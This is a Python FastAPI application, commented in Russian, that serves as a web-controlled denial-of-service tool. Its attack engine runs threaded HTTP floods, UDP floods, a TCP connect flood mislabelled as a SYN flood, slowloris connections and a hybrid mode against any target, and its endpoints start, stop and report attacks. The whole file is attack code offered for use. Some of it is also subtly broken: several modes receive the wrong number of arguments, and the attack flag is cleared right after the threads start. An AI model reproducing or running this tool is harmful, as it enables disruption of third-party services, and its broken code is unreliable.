from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import asyncio
import json
import random
import socket
import ssl
import threading
import time
from datetime import datetime
from typing import List, Dict

app = FastAPI()

# Подключаем статику
app.mount("/static", StaticFiles(directory="static"), name="static")

# ============================================================
#  МОДЕЛИ ДАННЫХ
# ============================================================
class AttackConfig(BaseModel):
    target: str
    port: int = 80
    method: str = "http"  # http, udp, tcp, slowloris, hybrid
    threads: int = 50
    duration: int = 30
    payload_size: int = 1024
    use_ssl: bool = False
    proxy_list: List[str] = []

# ============================================================
#  ДВИЖОК АТАК
# ============================================================
class AttackEngine:
    def __init__(self):
        self.active = False
        self.stats = {"sent": 0, "failed": 0, "bytes": 0}
        self.websocket = None
        
    async def broadcast(self, data):
        if self.websocket:
            try:
                await self.websocket.send_text(json.dumps(data))
            except:
                pass
    
    def http_flood(self, target, port, threads, duration, use_ssl, payload_size):
        """HTTP-флуд с реальными запросами"""
        def worker():
            proto = "https" if use_ssl else "http"
            url = f"{proto}://{target}:{port}/"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
            payload = "X" * payload_size
            
            start_time = time.time()
            while self.active and (time.time() - start_time) < duration:
                try:
                    if use_ssl:
                        import urllib.request
                        req = urllib.request.Request(url, data=payload.encode() if payload_size > 0 else None, headers=headers)
                        response = urllib.request.urlopen(req, timeout=3)
                        self.stats["sent"] += 1
                        self.stats["bytes"] += len(payload)
                    else:
                        import http.client
                        conn = http.client.HTTPConnection(target, port, timeout=3)
                        conn.request("POST" if payload_size > 0 else "GET", "/", body=payload if payload_size > 0 else None, headers=headers)
                        response = conn.getresponse()
                        self.stats["sent"] += 1
                        self.stats["bytes"] += len(payload)
                        conn.close()
                except Exception as e:
                    self.stats["failed"] += 1
                    pass
        
        for i in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def udp_flood(self, target, port, threads, duration, payload_size):
        """UDP-флуд"""
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(payload_size)
            start_time = time.time()
            while self.active and (time.time() - start_time) < duration:
                try:
                    sock.sendto(payload, (target, port))
                    self.stats["sent"] += 1
                    self.stats["bytes"] += payload_size
                except:
                    self.stats["failed"] += 1
                    pass
            sock.close()
        
        for i in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def tcp_flood(self, target, port, threads, duration, payload_size):
        """TCP SYN-флуд"""
        def worker():
            payload = random._urandom(payload_size)
            start_time = time.time()
            while self.active and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    sock.send(payload)
                    self.stats["sent"] += 1
                    self.stats["bytes"] += payload_size
                    sock.close()
                except:
                    self.stats["failed"] += 1
                    pass
        
        for i in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def slowloris(self, target, port, threads, duration, use_ssl):
        """Slowloris — медленные соединения"""
        def worker():
            start_time = time.time()
            sockets = []
            try:
                for _ in range(10):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    if use_ssl:
                        try:
                            context = ssl.create_default_context()
                            sock = context.wrap_socket(sock, server_hostname=target)
                        except:
                            pass
                    sock.send(b"GET / HTTP/1.1\r\n")
                    sock.send(b"Host: " + target.encode() + b"\r\n")
                    sock.send(b"User-Agent: Mozilla/5.0\r\n")
                    # Не отправляем завершающие \r\n\r\n — держим соединение открытым
                    sockets.append(sock)
                
                while self.active and (time.time() - start_time) < duration:
                    for sock in sockets:
                        try:
                            sock.send(b"X-Header: " + random._urandom(10) + b"\r\n")
                        except:
                            sockets.remove(sock)
                    time.sleep(10)
            except:
                pass
            finally:
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        for i in range(threads):
            threading.Thread(target=worker, daemon=True).start()
    
    def hybrid(self, target, port, threads, duration, use_ssl, payload_size):
        """Гибрид: HTTP + UDP + TCP"""
        # Запускаем все методы в уменьшенном количестве потоков
        per_method = max(1, threads // 3)
        self.http_flood(target, port, per_method, duration, use_ssl, payload_size)
        self.udp_flood(target, port, per_method, duration, payload_size)
        self.tcp_flood(target, port, per_method, duration, payload_size)

engine = AttackEngine()

# ============================================================
#  WEBSOCKET ДЛЯ ЖИВОЙ СТАТИСТИКИ
# ============================================================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    engine.websocket = websocket
    try:
        while True:
            await websocket.receive_text()  # keep-alive
    except WebSocketDisconnect:
        engine.websocket = None

# ============================================================
#  API ЭНДПОИНТЫ
# ============================================================
@app.post("/start")
async def start_attack(config: AttackConfig, background_tasks: BackgroundTasks):
    if engine.active:
        return {"status": "error", "message": "Атака уже запущена"}
    
    engine.active = True
    engine.stats = {"sent": 0, "failed": 0, "bytes": 0}
    
    background_tasks.add_task(
        run_attack,
        config.target,
        config.port,
        config.method,
        config.threads,
        config.duration,
        config.use_ssl,
        config.payload_size
    )
    
    return {"status": "started", "message": f"Атака запущена на {config.target}:{config.port}"}

@app.post("/stop")
async def stop_attack():
    engine.active = False
    return {"status": "stopped", "message": "Атака остановлена"}

@app.get("/stats")
async def get_stats():
    return {
        "active": engine.active,
        "sent": engine.stats["sent"],
        "failed": engine.stats["failed"],
        "bytes": engine.stats["bytes"]
    }

def run_attack(target, port, method, threads, duration, use_ssl, payload_size):
    method_map = {
        "http": engine.http_flood,
        "udp": engine.udp_flood,
        "tcp": engine.tcp_flood,
        "slowloris": engine.slowloris,
        "hybrid": engine.hybrid
    }
    
    func = method_map.get(method, engine.http_flood)
    func(target, port, threads, duration, use_ssl, payload_size)
    
    # По окончании отправляем финальные данные
    engine.active = False
    import asyncio
    asyncio.run(engine.broadcast({"type": "finished", "stats": engine.stats}))

# ============================================================
#  ЗАПУСК
# ============================================================
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
